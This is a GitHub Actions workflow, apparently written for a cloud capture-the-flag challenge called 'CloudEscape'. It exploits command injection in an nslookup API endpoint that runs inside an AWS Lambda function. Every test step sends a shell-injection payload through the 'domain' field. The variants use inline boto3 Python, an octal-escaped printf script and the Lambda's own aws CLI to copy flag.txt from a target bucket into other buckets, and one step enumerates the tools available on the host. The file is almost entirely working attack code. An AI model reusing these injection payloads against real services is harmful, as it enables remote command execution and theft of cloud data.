name: CloudEscape Stage 1 - Get Flag v9
on:
  workflow_dispatch:
  push:
    branches: [corgi]

permissions:
  id-token: write
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Test A - Use /var/task/python3 path
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Try different python paths
          for py in python3 /var/lang/bin/python3 /usr/bin/python3; do
            PAYLOAD=$(python3 -c "
            import json
            cmd = 'x; $py -c \"import boto3; c=boto3.client(\\x27s3\\x27,region_name=\\x27us-east-1\\x27); c.put_object(Bucket=\\x27platform-bucket-009661764077-us-east-1\\x27,Key=\\x27test_\\\$(echo $py|tr / _).txt\\x27,Body=b\\x27HELLO\\x27)\" 2>&1'
            print(json.dumps({'domain': cmd}))
            ")
            echo "=== $py ==="
            echo "Payload: $PAYLOAD"
            curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
            echo
            sleep 5
          done
          sleep 10
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Test B - Write script via printf (no quoting issues)
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Use printf with octal escapes to write Python script
          # printf is a shell builtin, always available in /bin/sh
          # Script: get flag, put to platform bucket
          PAYLOAD=$(python3 << 'PYEOF'
          import json
          
          # The Python script we want to execute in Lambda
          script = "import boto3,traceback\n"
          script += "c=boto3.client('s3',region_name='us-east-1')\n"
          script += "try:\n"
          script += "    r=c.get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')\n"
          script += "    f=r['Body'].read()\n"
          script += "    c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='flag.txt',Body=f)\n"
          script += "except Exception as ex:\n"
          script += "    c.put_object(Bucket='platform-bucket-009661764077-us-east-1',Key='error.txt',Body=str(ex).encode())\n"
          
          # Convert to printf format: each char as \NNN octal
          printf_arg = ''.join(f'\\{ord(c):03o}' for c in script)
          
          cmd = f'x; printf "{printf_arg}" > /tmp/s.py; python3 /tmp/s.py 2>&1'
          
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          
          echo "=== Test B: printf method ==="
          echo "Payload: ${#PAYLOAD} bytes"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Test C - Use /var/lang/bin/python3 with -c and proper escaping
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # The issue is shell quoting. In /bin/sh:
          # - Double quotes allow variable expansion
          # - Single quotes prevent ALL expansion
          # So we need: /var/lang/bin/python3 -c 'script with double quotes inside'
          
          PAYLOAD=$(python3 << 'PYEOF'
          import json
          
          # Use SINGLE QUOTES for the Python -c argument
          # Inside Python code, use DOUBLE QUOTES for strings
          cmd = """x; /var/lang/bin/python3 -c 'import boto3; c=boto3.client("s3",region_name="us-east-1"); r=c.get_object(Bucket="codec4f26c862a321ef5",Key="flag.txt"); f=r["Body"].read(); c.put_object(Bucket="platform-bucket-009661764077-us-east-1",Key="flag.txt",Body=f)' 2>&1"""
          
          print(json.dumps({'domain': cmd}))
          PYEOF
          )
          
          echo "=== Test C: single-quote python -c ==="
          echo "Payload: $PAYLOAD"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Test D - Check if base64 exists in Lambda
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Check what's available: which base64, python3, etc.
          # Write result to S3 using /opt/bin/aws (which we know exists)
          PAYLOAD=$(python3 -c "
          import json
          cmd = 'x; which base64 python3 /var/lang/bin/python3 /opt/bin/aws > /tmp/tools.txt 2>&1; ls /bin/ >> /tmp/tools.txt 2>&1; /opt/bin/aws s3 cp /tmp/tools.txt s3://platform-bucket-009661764077-us-east-1/tools.txt --region us-east-1 2>&1'
          print(json.dumps({'domain': cmd}))
          ")
          
          echo "=== Test D: check tools ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/tools.txt - --region us-east-1 2>&1

      - name: Test E - Use /opt/bin/aws s3 cp to copy flag
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # Simplest possible: use /opt/bin/aws s3 cp to copy flag directly
          PAYLOAD=$(python3 -c "
          import json
          cmd = 'x; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1 2>&1'
          print(json.dumps({'domain': cmd}))
          ")
          
          echo "=== Test E: aws s3 cp flag ==="
          echo "Payload: $PAYLOAD"
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1

      - name: Test F - Copy flag using /opt/bin/aws with Lambda's own role
        continue-on-error: true
        run: |
          API="https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
          
          # The Lambda already has AWS credentials from its execution role
          # /opt/bin/aws should pick them up from env vars
          # Try to copy flag to BOTH platform and site buckets
          PAYLOAD=$(python3 -c "
          import json
          cmd = 'x; /opt/bin/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag --region us-east-1; /opt/bin/aws s3 cp /tmp/flag s3://platform-bucket-009661764077-us-east-1/flag.txt --region us-east-1; /opt/bin/aws s3 cp /tmp/flag s3://site781fe43f26b9eba3/flag.txt --region us-east-1'
          print(json.dumps({'domain': cmd}))
          ")
          
          echo "=== Test F: aws s3 cp to both buckets ==="
          curl -s -X POST "$API/dev/nslookup" -H "Content-Type: application/json" -d "$PAYLOAD"
          echo
          sleep 12
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
          echo "---"
          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1

      - name: Final check
        if: always()
        run: |
          echo "===== Platform bucket ====="
          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1
          
          echo "===== Read tools.txt ====="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/tools.txt - --region us-east-1 2>&1
          echo
          echo "===== Read flag ====="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/flag.txt - --region us-east-1 2>&1
          echo
          echo "===== Read error ====="
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/error.txt - --region us-east-1 2>&1
          echo
          echo "===== Site bucket ====="
          aws s3 ls s3://site781fe43f26b9eba3/ --region us-east-1 2>&1
          echo
          echo "===== Read site flag ====="
          aws s3 cp s3://site781fe43f26b9eba3/flag.txt - --region us-east-1 2>&1